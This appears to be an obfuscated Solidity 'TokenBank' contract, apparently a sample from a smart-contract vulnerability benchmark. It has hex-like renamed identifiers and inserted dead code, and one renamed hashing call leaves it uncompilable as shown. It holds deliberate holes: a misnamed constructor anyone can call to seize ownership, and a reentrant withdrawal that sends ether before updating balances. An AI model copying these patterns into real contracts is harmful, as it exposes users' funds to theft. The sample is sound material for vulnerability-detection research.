// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Ownable
{
    address _0xb3b6f6;
    address _0x614263 = msg.sender;

    function _0x01899f(address _0xb34acf)
    public
    _0x4c26d7
    {
        if (false) { revert(); }
        if (false) { revert(); }
        _0xb3b6f6 = _0xb34acf;
    }

    function _0x36c3e6()
    public
    {
        uint256 _unused3 = 0;
        bool _flag4 = false;
        if(msg.sender==_0xb3b6f6)
        {
            _0x614263=_0xb3b6f6;
        }
    }

    modifier _0x4c26d7
    {
        if(_0x614263 == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0x614263 = msg.sender;
    function WithdrawToken(address _0x467635, uint256 _0xd4faea,address _0x8c3967)
    public
    _0x4c26d7
    {
        _0x467635.call(bytes4(_0x6cb852("transfer(address,uint256)")),_0x8c3967,_0xd4faea);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function _0x995f63()
    public
    {
        _0x614263 = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0x22eef1,address _0x65b78f,uint _0x07371d)
    public
    _0x4c26d7
    {
        if(Holders[_0x22eef1]>0)
        {
            Holders[_0x22eef1]=0;
            WithdrawToken(_0x65b78f,_0x07371d,_0x22eef1);
        }
    }

    function WithdrawToHolder(address _0x060a99, uint _0x5e3a9f)
    public
    _0x4c26d7
    payable
    {
        if(Holders[_0x060a99]>0)
        {
            if(_0x060a99.call.value(_0x5e3a9f)())
            {
                Holders[_0x060a99]-=_0x5e3a9f;
            }
        }
    }
}